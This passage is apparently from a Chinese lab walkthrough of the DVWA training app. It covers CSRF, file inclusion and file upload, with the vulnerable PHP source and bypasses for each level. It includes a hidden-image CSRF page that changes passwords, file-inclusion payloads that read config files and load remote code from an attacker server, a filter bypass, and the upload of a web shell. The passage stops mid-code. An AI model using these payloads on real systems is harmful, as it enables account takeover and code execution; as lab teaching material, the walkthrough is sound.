class="line">http:&#x2F;&#x2F;192.168.220.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new&#x3D;hack&amp;password_conf&#x3D;hack&amp;Change&#x3D;Change</span><br></pre></td></tr></table></figure><p>常见的伪装方式：</p><ol><li><p><strong>短链接来隐藏url</strong></p><p>需要注意的是，虽然利用了短链接隐藏url，但受害者最终还是会看到密码修改成功的页面，所以这种攻击方法也并不高明。</p><p><img src="https://i.loli.net/2020/03/01/W3GVqpayDh259od.png"></p></li><li><p><strong>精心构造攻击页面</strong></p><p>现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;192.168.153.130&#x2F;dvwa&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new&#x3D;hack&amp;password_conf&#x3D;hack&amp;Change&#x3D;Change#&quot; border&#x3D;&quot;0&quot; style&#x3D;&quot;display:none;&quot;&#x2F;&gt;&lt;h1&gt;404&lt;h1&gt;&lt;h2&gt;file not found.&lt;h2&gt;</span><br></pre></td></tr></table></figure><p>当受害者访问<code>test.html</code>时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了hack。而原来的密码password就登不上去了。</p><p><img src="https://i.loli.net/2020/03/01/iX4bgD3yxpfESTI.png"></p></li></ol><h2 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Checks to see where the request came from</span></span><br><span class="line">    <span class="keyword">if</span>( stripos( $_SERVER[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,$_SERVER[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        $pass_new  = $_GET[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">        $pass_conf = $_GET[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">            $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            $insert = <span class="string">&quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">            $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Didn&#x27;t come from a trusted source</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>stripos( <code>$string</code> ,<code>$pattern</code>)</p><p>string中pattern的位置，如果有返回位置序号，反之False。</p></blockquote><p>可以看到，Medium级别的代码检查了保留变量 <code>HTTP_REFERER</code>（http包头的Referer参数的值，表示来源地址）中是否包含<code>SERVER_NAME</code>（http包头的Host参数，及要访问的主机名，这里是<code>192.168.220.1</code>），希望通过这种机制抵御CSRF攻击。</p><p><strong>漏洞利用</strong></p><p>过滤规则是http包头的Referer参数的值中必须包含主机名（这里是<code>192.168.220.1</code>）我们可以将攻击页面命名为<code>192.168.220.1.html</code>或者放到文件夹<code>192.168.220.1</code>下</p><p><img src="https://i.loli.net/2020/03/03/Y9ljd3tPvcMraKy.png"></p><p><code>192.168.253.129</code>是攻击者的服务器。</p><h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">&quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，High级别的代码加入了<code>Anti-CSRF token</code>机制，用户每次访问改密页面时，服务器会返回一个随机的<code>token</code>，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p><p><strong>漏洞利用</strong></p><p>要绕过High级别的反CSRF机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。</p><p>这就需要利用XSS弹<code>cookie</code>，得到<code>cookie</code>中的<code>token</code>, 加入token后访问才行。</p><p>这里利用dvwa的存储型XSS的漏洞，来弹token。</p><h2 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_curr = $_GET[ <span class="string">&#x27;password_current&#x27;</span> ];</span><br><span class="line">    $pass_new  = $_GET[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise current password input</span></span><br><span class="line">    $pass_curr = stripslashes( $pass_curr );</span><br><span class="line">    $pass_curr = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_curr ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass_curr = md5( $pass_curr );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that the current password is correct</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">&#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, $pass_curr, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do both new passwords match and does the current password match the user?</span></span><br><span class="line">    <span class="keyword">if</span>( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == <span class="number">1</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// It does!</span></span><br><span class="line">        $pass_new = stripslashes( $pass_new );</span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database with new password</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, $pass_new, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码利用PDO技术防御SQL注入，至于防护CSRF，则要求用户输入原始密码（简单粗暴），攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。</p><h1 id="File-inclusion-文件包含"><a href="#File-inclusion-文件包含" class="headerlink" title="File inclusion(文件包含)"></a>File inclusion(文件包含)</h1><p>文件包含,分为两种：本地文件包含和远程文件包含。当服务器开启<code>allow_url_include</code>选项的时候，就可以通过php的包含函数（类似python，java的import）<code>include(),require(),require_once(),include_once()</code>利用url去动态包含文件，此时如果没有对文件来源进行检查，就容易导致任意文件读取和任意命令执行。</p><h2 id="Low-3"><a href="#Low-3" class="headerlink" title="Low"></a>Low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一行代码，十分简单，对page参数没有做任何的过滤跟检查。</p><blockquote><p>服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p></blockquote><p>page参数可控，可以先尝试本地文件包含。</p><p>尝试<code>?page=/etc/shadow</code></p><p>但是因为我的环境直接放在Windows，没有报错了，而且爆出了网站路径，可以进一步查找<code>php.ini</code>(php的配置文件)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?page&#x3D;D:\Environment\phpstudy_pro\WWW\dvwa\php.ini</span><br><span class="line">或者</span><br><span class="line">page&#x3D;..\..\..\..\..\..\..\Environment\phpstudy_pro\WWW\dvwa\php.ini</span><br><span class="line"></span><br><span class="line">This file attempts to overwrite the original php.ini file. Doesnt always work. </span><br><span class="line">magic_quotes_gpc &#x3D; Off </span><br><span class="line">allow_url_fopen on </span><br><span class="line">allow_url_include on</span><br></pre></td></tr></table></figure><p>发现是允许远程文件包含。配置文件中的<code>Magic_quote_gpc</code>选项为off。在php版本<code>&lt;5.3.4</code>的服务器中，当<code>Magic_quote_gpc</code>选项为off时，我们可以在文件名中使用<code>%00</code>进行截断，也就是说文件名中<code>%00</code>后的内容不会被识别。使用<code>%00</code>截断可以绕过某些过滤规则，例如要求page参数的后缀必须为php。</p><p>因为打开<code>allow_url_fopen</code>和<code>allow_url_include</code>还可以通过远程文件包含，可以通过远程文件包含，可以导致任意代码执行。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?page&#x3D;http:&#x2F;&#x2F;192.168.253.129&#x2F;test.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/01/s9JWv5jlnCxuPQL.png"></p><p>需要注意，文件是一般文件（比如txt），然后远程文件包含的时候当做php执行，这样就可以在靶机执行任意代码。但是如果远程包含一个php文件，就只是直接访问而已（以远程文件所在的服务器环境执行），而不是执行代码。如下（我的靶机是<code>Windows</code>, 远程文件放在<code>Linux</code>）：</p><p><img src="https://i.loli.net/2020/03/01/rovZbXY9ucGeatO.png"></p><h2 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h2><p>相比于Low级别，加了一点过滤。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, $file );</span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\&quot;&quot;</span> ), <span class="string">&quot;&quot;</span>, $file );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将<code>http://</code>或者<code>https://</code>或者<code>../</code>,<code>..\</code>替换成空。</p><p>但是这种程度的过滤，平角裤平角裤…</p><p>一方面，我们仍然可以通过双写绕过过滤字符，二方面，可以采用绝对路径进行本地文件包含。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?page&#x3D;htthttp:&#x2F;&#x2F;p:&#x2F;&#x2F;192.168.253.129&#x2F;test.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/03/FfQy6DwhJjGg1XI.png"></p><h2 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">&quot;file*&quot;</span>, $file ) &amp;&amp; $file != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>fnmatch ( string <code>$pattern</code> , string <code>$string</code> [, int <code>$flags</code> = 0 ] ) : bool</p><p><strong>fnmatch()</strong> 检查传入的 <code>string</code> 是否匹配给出的 shell 统配符 <code>pattern</code>。</p></blockquote><p>匹配文件名，只能是<code>file*</code>，但是我们依然可以利用<code>file://</code>协议来读取文件！</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?page&#x3D;file:&#x2F;&#x2F;&#x2F;D:&#x2F;Environment&#x2F;PhpStudy2018&#x2F;PHPTutorial&#x2F;WWW&#x2F;dvwa&#x2F;php.ini</span><br></pre></td></tr></table></figure><p>至于执行任意命令，需要配合文件上传漏洞利用。首先需要上传一个内容为php的文件，然后再利用file协议去包含（本地文件包含）上传文件（需要知道上传文件的绝对路径），从而实现任意命令执行。</p><h2 id="Impossible-2"><a href="#Impossible-2" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;php</span><br><span class="line"><span class="comment">//Thepagewewishtodisplay</span></span><br><span class="line">$file=$_GET[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//Onlyallowinclude.phporfile&#123;1..3&#125;.php</span></span><br><span class="line"><span class="keyword">if</span>($file!=<span class="string">&quot;include.php&quot;</span>&amp;&amp;$file!=<span class="string">&quot;file1.php&quot;</span>&amp;&amp;$file!=<span class="string">&quot;file2.php&quot;</span>&amp;&amp;$file!=<span class="string">&quot;file3.php&quot;</span>)&#123;</span><br><span class="line"><span class="comment">//Thisisn&#x27;tthepagewewant!</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;ERROR:Filenotfound!&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为<code>include.php、file1.php、file2.php、file3.php</code>之一，彻底杜绝了文件包含漏洞。</p><h1 id="File-Upload（文件上传）"><a href="#File-Upload（文件上传）" class="headerlink" title="File Upload（文件上传）"></a>File Upload（文件上传）</h1><p>上传文件漏洞，通常时候由于对上传文件的类型、内容没有做严格过滤检查，使得攻击者可以通过上传木马来getshell。</p><h2 id="Low-4"><a href="#Low-4" class="headerlink" title="Low"></a>Low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">    <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], $target_path ) ) &#123;</span><br><span class="line">        <span class="comment">// No</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Yes!</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>basename(path, suffix)</code></p><p>函数返回路径中的文件名部分，如果可选参数suffix为空，则返回的文件名包含后缀名，反之不包含后缀名。</p></blockquote><p>可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。</p><p>文件上传漏洞的利用是有限制条件的</p><ol><li><p>首先当然是要能够成功上传木马文件</p></li><li><p>其次上传文件必须能够被执行</p></li><li><p>最后就是上传文件的路径必须可知。</p></li></ol><p>不幸的是，这里三个条件全都满足。上传一个一句话木马。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;..&#x2F;hackable&#x2F;uploads&#x2F;v0w.php succesfully uploaded!</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/01/APCkEynZzlLwJFS.png"></p><h2 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    $uploaded_type = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( $uploaded_type == <span class="string">&quot;image/jpeg&quot;</span> || $uploaded_type == <span class="string">&quot;image/png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], $target_path ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>相比于low级别，验证了上传的文件类型要是<code>image/jpeg || image/png</code>。burp接收，修改字段<code>Content-Type</code>即可。</p><p><img src="https://i.loli.net/2020/03/03/XosupF72v9MTJ8U.png"></p><h2 id="High-3"><a href="#High-3" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line">    $uploaded_tmp  = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">&quot;jpg&quot;</span> || strtolower( $uploaded_ext ) == <span class="string">&quot;jpeg&quot;</span> || strtolower( $uploaded_ext ) == <span class="string">&quot;png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; <span 